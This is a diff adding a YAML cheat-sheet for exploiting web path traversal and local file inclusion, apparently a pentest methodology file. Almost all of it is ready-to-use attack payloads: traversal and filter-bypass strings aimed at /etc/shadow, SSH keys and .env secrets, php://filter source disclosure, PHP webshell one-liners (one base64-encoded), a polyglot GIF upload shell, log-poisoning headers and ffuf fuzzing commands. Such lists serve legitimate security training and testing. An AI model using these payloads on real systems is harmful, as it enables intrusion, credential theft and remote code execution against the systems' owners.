@@ -1,0 +1,382 @@
+name: Web Path Traversal & LFI
+
+steps:
+
+# =========================================================
+# [1] IDENTIFY FILE PARAMETERS
+# =========================================================
+- title: Identify File Parameters
+  mode: enum
+  info: |
+    Find parameters that load files, templates, images, languages,
+    exports, downloads, or includes.
+
+  entries:
+
+    - cmd: "GET /image?filename=test.jpg"
+      info: image parameter
+
+    - cmd: "GET /index.php?page=home"
+      info: template parameter
+
+    - cmd: "GET /index.php?language=en"
+      info: language include
+
+    - cmd: "GET /download?file=report.pdf"
+      info: download parameter
+
+    - cmd: "GET /load?template=default"
+      info: template loading
+
+  look_for:
+    - file paths
+    - include behavior
+    - stack traces
+    - file errors
+    - source disclosure
+    - reflected paths
+
+  notes:
+    - image endpoints are common traversal targets
+    - language/template params often lead to LFI
+    - fuzz undocumented parameters
+
+
+# =========================================================
+# [2] BASIC PATH TRAVERSAL
+# =========================================================
+- title: Basic Traversal Payloads
+  mode: enum
+  info: |
+    Attempt directory traversal to access sensitive files.
+
+  entries:
+
+    - cmd: "../../../etc/passwd"
+      info: linux traversal
+
+    - cmd: "../../../../../../etc/passwd"
+      info: over-traversal
+
+    - cmd: "..\\..\\..\\windows\\win.ini"
+      info: windows traversal
+
+    - cmd: "/etc/passwd"
+      info: absolute path bypass
+
+    - cmd: "C:\\Windows\\win.ini"
+      info: windows absolute path
+
+  look_for:
+    - root:x:
+    - daemon:
+    - www-data
+    - windows ini content
+    - file disclosure
+
+  notes:
+    - overusing ../ usually safe
+    - absolute paths bypass weak traversal filters
+    - Windows targets differ from Linux
+
+
+# =========================================================
+# [3] TRAVERSAL FILTER BYPASSES
+# =========================================================
+- title: Traversal Filter Bypasses
+  mode: enum
+  info: |
+    Bypass sanitization, blacklist filters, and recursive stripping.
+
+  entries:
+
+    - cmd: "....//....//....//etc/passwd"
+      info: non-recursive stripping bypass
+
+    - cmd: "..%2f..%2f..%2fetc/passwd"
+      info: URL encoded traversal
+
+    - cmd: "..%252f..%252f..%252fetc/passwd"
+      info: double URL encoding
+
+    - cmd: "..%c0%af..%c0%afetc/passwd"
+      info: unicode encoding bypass
+
+    - cmd: "/var/www/images/../../../etc/passwd"
+      info: approved path bypass
+
+    - cmd: "../../../etc/passwd%00.png"
+      info: null byte extension bypass
+
+  look_for:
+    - filter bypass
+    - path normalization issues
+    - URL decoding
+    - extension truncation
+
+  notes:
+    - many apps decode input after filtering
+    - null bytes mostly work on old PHP
+    - approved path regexes often bypassable
+
+
+# =========================================================
+# [4] HIGH VALUE FILES
+# =========================================================
+- title: High Value File Targets
+  mode: enum
+  info: |
+    Read sensitive local files after confirming traversal or LFI.
+
+  entries:
+
+    - cmd: "/etc/passwd"
+      info: linux users
+
+    - cmd: "/etc/shadow"
+      info: password hashes
+
+    - cmd: "/etc/hosts"
+      info: host mappings
+
+    - cmd: "/proc/self/environ"
+      info: environment variables
+
+    - cmd: "/var/www/html/config.php"
+      info: web config
+
+    - cmd: "/var/www/html/.env"
+      info: environment secrets
+
+    - cmd: "/home/*/.ssh/id_rsa"
+      info: SSH keys
+
+    - cmd: "C:\\Windows\\win.ini"
+      info: windows test file
+
+    - cmd: "C:\\inetpub\\wwwroot\\web.config"
+      info: IIS config
+
+  look_for:
+    - passwords
+    - API keys
+    - database creds
+    - tokens
+    - SSH keys
+    - internal paths
+
+  notes:
+    - config files often lead to full compromise
+    - .env files commonly expose secrets
+    - webroot discovery is critical
+
+
+# =========================================================
+# [5] PHP FILTER SOURCE DISCLOSURE
+# =========================================================
+- title: PHP Filter Source Disclosure
+  mode: enum
+  info: |
+    Read PHP source code instead of executing it.
+
+  entries:
+
+    - cmd: "php://filter/read=convert.base64-encode/resource=index"
+      info: read index.php source
+
+    - cmd: "php://filter/read=convert.base64-encode/resource=config"
+      info: read config.php source
+
+    - cmd: "echo '<BASE64>' | base64 -d"
+      info: decode source locally
+
+  look_for:
+    - credentials
+    - hidden routes
+    - SQL queries
+    - upload paths
+    - command sinks
+
+  notes:
+    - extension .php often appended automatically
+    - filters bypass PHP execution
+    - one of the most important LFI techniques
+
+
+# =========================================================
+# [6] LFI TO RCE - PHP WRAPPERS
+# =========================================================
+- title: PHP Wrapper RCE
+  mode: chain
+  info: |
+    Achieve code execution using PHP wrappers.
+
+  entries:
+
+    - cmd: "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+"
+      info: data wrapper webshell
+
+    - cmd: "?page=data://text/plain;base64,<BASE64>&cmd=id"
+      info: execute command
+
+    - cmd: "?page=php://input&cmd=id"
+      info: php input wrapper
+
+    - cmd: "POST <?php system($_GET['cmd']); ?>"
+      info: POST body shell
+
+    - cmd: "?page=expect://id"
+      info: direct command execution
+
+  look_for:
+    - uid=
+    - www-data
+    - command output
+
+  notes:
+    - allow_url_include usually required
+    - expect:// rarely enabled
+    - data:// very common in labs
+
+
+# =========================================================
+# [7] FILE UPLOAD + LFI TO RCE
+# =========================================================
+- title: Upload + LFI RCE
+  mode: chain
+  info: |
+    Combine file upload with LFI for code execution.
+
+  entries:
+
+    - cmd: "echo 'GIF8<?php system($_GET[\"cmd\"]); ?>' > shell.gif"
+      info: polyglot GIF shell
+
+    - cmd: "upload shell.gif"
+      info: upload payload
+
+    - cmd: "?page=./uploads/shell.gif&cmd=id"
+      info: execute uploaded shell
+
+    - cmd: "zip shell.jpg shell.php"
+      info: zip wrapper payload
+
+    - cmd: "zip://shell.jpg%23shell.php"
+      info: zip wrapper include
+
+  look_for:
+    - command execution
+    - uploaded path
+    - web-accessible uploads
+
+  notes:
+    - upload + execute-capable LFI = RCE
+    - GIF magic bytes bypass content checks
+    - image upload is most reliable technique
+
+
+# =========================================================
+# [8] LOG POISONING
+# =========================================================
+- title: Log Poisoning
+  mode: chain
+  info: |
+    Inject PHP into logs and include them via LFI.
+
+  entries:
+
+    - cmd: "<?php system($_GET['cmd']); ?>"
+      info: payload
+
+    - cmd: "User-Agent: <?php system($_GET['cmd']); ?>"
+      info: inject into access log
+
+    - cmd: "/var/log/apache2/access.log"
+      info: apache access log
+
+    - cmd: "/var/log/nginx/access.log"
+      info: nginx access log
+
+    - cmd: "?page=/var/log/apache2/access.log&cmd=id"
+      info: trigger execution
+
+  look_for:
+    - payload reflected in logs
+    - command output
+    - successful inclusion
+
+  notes:
+    - requires writable logs
+    - common LFI → RCE chain
+    - apache logs are high-value targets
+
+
+# =========================================================
+# [9] FUZZING & AUTOMATION
+# =========================================================
+- title: Fuzzing & Automation
+  mode: enum
+  info: |
+    Use automation to discover parameters, files, and traversal payloads.
+
+  entries:
+
+    - cmd: "ffuf -w burp-parameter-names.txt:FUZZ -u 'http://target/index.php?FUZZ=test'"
+      info: parameter fuzzing
+
+    - cmd: "ffuf -w LFI-Jhaddix.txt:FUZZ -u 'http://target/index.php?page=FUZZ'"
+      info: LFI fuzzing
+
+    - cmd: "ffuf -w default-web-root-directory-linux.txt:FUZZ -u 'http://target/index.php?page=../../../../FUZZ/index.php'"
+      info: webroot fuzzing
+
+  look_for:
+    - response length changes
+    - HTTP 200
+    - file disclosure
+    - traversal success
+
+  notes:
+    - automation finds entry points
+    - manual chaining still required
+    - always verify results manually
+
+
+# =========================================================
+# [10] TRAVERSAL & LFI WORKFLOW
+# =========================================================
+- title: Traversal & LFI Workflow
+  mode: enum
+  info: |
+    Practical methodology for exploiting traversal and LFI.
+
+  entries:
+
+    - cmd: "1. Identify file parameter"
+      info: discovery
+
+    - cmd: "2. Test traversal payloads"
+      info: basic exploitation
+
+    - cmd: "3. Try filter bypasses"
+      info: encoding and recursion
+
+    - cmd: "4. Read sensitive files"
+      info: credential hunting
+
+    - cmd: "5. Discover webroot and configs"
+      info: server enumeration
+
+    - cmd: "6. Use php://filter for source"
+      info: source disclosure
+
+    - cmd: "7. Attempt wrapper RCE"
+      info: direct execution
+
+    - cmd: "8. Chain upload/log poisoning"
+      info: full compromise
+
+  notes:
+    - traversal and LFI usually overlap
+    - source disclosure often leads to RCE
+    - configs and logs are priority targets
